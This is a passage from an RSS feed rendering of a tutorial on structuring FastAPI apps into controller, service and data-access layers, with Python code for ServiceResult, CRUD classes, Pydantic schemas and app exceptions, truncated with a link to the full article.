<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span></code></pre></div>
<h2 id="service-result-class--success--exceptions" data-v-3d5c50e8="">Service Result Class ‚Äì Success &amp; Exceptions</h2>
<p data-v-3d5c50e8="">The <code data-v-3d5c50e8="">ServiceResult</code> class defines a generic outcome of a service operation. In case the operation is successful, the outcome (or "value") is returned contained within the value attribute of the instance. In case of a custom app exception, the service result instance contains information about the raised exception (e.g., which status code should be returned to the client).</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">‚¨§</span> <span data-v-594b4fde="">‚¨§</span> <span data-v-594b4fde="">‚¨§</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ‚Ä∫</span></span><span data-v-594b4fde="">service_result.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> arg</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">isinstance</span><span data-v-3d5c50e8="">(arg, AppExceptionCase):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">False</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.exception_case</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">else</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">14</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"[Success]"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">15</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">'[Exception] "</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">"'</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">16</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__repr__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">17</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">18</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"&lt;ServiceResult Success&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">19</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;ServiceResult AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">20</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__enter__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">21</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">22</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__exit__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">*</span><span data-v-3d5c50e8="">kwargs</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">23</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">pass</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">24</span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">handle_result</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">result</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">) -&gt; :</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">25</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> result.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">26</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> exception:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">27</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">raise</span><span data-v-3d5c50e8=""> exception</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">28</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> result:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">29</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> result</span></span></code></pre></div>
<h2 id="service-layer--business-logic" data-v-3d5c50e8="">Service Layer ‚Äì Business Logic</h2>
<p data-v-3d5c50e8="">Services are defined in the <code data-v-3d5c50e8="">services</code> package. Each service is a subclass of <code data-v-3d5c50e8="">AppService</code>. The database session is passed down from the request dependency via an "interface-like" mixin utility class (other mixing classes may be added via multiple inheritance in order to extend available attributes).</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> DBSessionMixin</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Session</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> db</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppService(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppCRUD(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routes belonging to service <code data-v-3d5c50e8="">Foo</code> are connected to methods of <code data-v-3d5c50e8="">FooService</code>, which encapsulates all business logic of the service. The return value are of type <code data-v-3d5c50e8="">ServiceResult</code>: Containing a value attribute with returnable data or, in case of an exception, an <code data-v-3d5c50e8="">AppException</code>. In both cases, the respective result is returned back "upwards" to the controller layer.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooService(AppService)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooCreateItem())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooGetItem({</span><span data-v-3d5c50e8="">"item_id"</span><span data-v-3d5c50e8="">: item_id}))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item.public:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooItemRequiresAuth())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span></code></pre></div>
<h2 id="data-access-layer--database-operations" data-v-3d5c50e8="">Data Access Layer ‚Äì Database Operations</h2>
<p data-v-3d5c50e8="">CRUD helper methods perform operations on the database and are subclassing <code data-v-3d5c50e8="">AppCRUD</code>. The database session is passed down from the <code data-v-3d5c50e8="">AppService</code> instance. These methods are atomic and only concerned with operating on the database. They do not contain any business logic.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooCRUD(AppCRUD)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooItem(</span><span data-v-3d5c50e8="">description</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.description, </span><span data-v-3d5c50e8="">public</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.public)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.add(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.commit()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.refresh(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.query(FooItem).filter(FooItem.id </span><span data-v-3d5c50e8="">==</span><span data-v-3d5c50e8=""> item_id).first()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span></code></pre></div>
<p data-v-3d5c50e8="">Pydantic "schemas" or models are defined in the <code data-v-3d5c50e8="">schemas</code> package. They contain mainly two different kinds of data models. First, those expected from clients as request data (route parameters in route method definitions). Second, those expected to be returned to clients as response data (defined in response_model parameter of route definitions).</p>
<p data-v-3d5c50e8="">Additionally, it's possible to model any kind of data being passed inbetween the layers of the app (controller, service and data-access).</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemBase(BaseModel)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    description: </span><span data-v-3d5c50e8="">str</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemCreate(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    public: </span><span data-v-3d5c50e8="">bool</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">int</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> Config</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        orm_mode </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span></code></pre></div>
<p data-v-3d5c50e8="">SQLAlchemy models are defined in the <code data-v-3d5c50e8="">models</code> package. They define how data is stored within the relational database. They are referenced from <code data-v-3d5c50e8="">AppCRUD</code>. If needed, make sure to differentiate between <code data-v-3d5c50e8="">FooItem</code> models (SQLAlchemy) and <code data-v-3d5c50e8="">FooItem</code> schemas (Pydantic) by appropriate import namespacing.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(Base)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    __tablename__ </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"foo_items"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Integer, </span><span data-v-3d5c50e8="">primary_key</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">index</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    description </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(String)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    public </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Boolean, </span><span data-v-3d5c50e8="">default</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">False</span><span data-v-3d5c50e8="">)</span></span></code></pre></div>
<h2 id="exception-handling" data-v-3d5c50e8="">Exception Handling</h2>
<p data-v-3d5c50e8="">App exceptions are implemented in the <code data-v-3d5c50e8="">utils</code> package. First, <code data-v-3d5c50e8="">AppExceptionCase</code> is subclassed from base <code data-v-3d5c50e8="">Exception</code> and includes various attributes for defining custom app exception scenarios. The exception handler with the task of handling custom app exceptions (added to <code data-v-3d5c50e8="">main</code>, see above) is defined with a response containing information about the app exception.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">‚¨§</span> <span data-v-594b4fde="">‚¨§</span> <span data-v-594b4fde="">‚¨§</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ‚Ä∫</span></span><span data-v-594b4fde="">app_exceptions.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppExceptionCase(</span><span data-v-3d5c50e8="">Exception</span><span data-v-3d5c50e8="">)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> status_code</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> context</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">dict</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__class__</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__name__</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> context</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> (</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - "</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">+</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"status_code=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - context=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        )</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> exc</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> AppExceptionCase</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span>‚Ä¶</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camillovisini.com/article/abstracting-fastapi-services/">https://camillovisini.com/article/abstracting-fastapi-services/</a></em></p>]]>
            </description>
            <link>https://camillovisini.com/article/abstracting-fastapi-services/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797140</guid>
            <pubDate>Fri, 15 Jan 2021 22:03:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Email is the messenger you should migrate to]]>
            </title>
            <description>
<![CDATA[
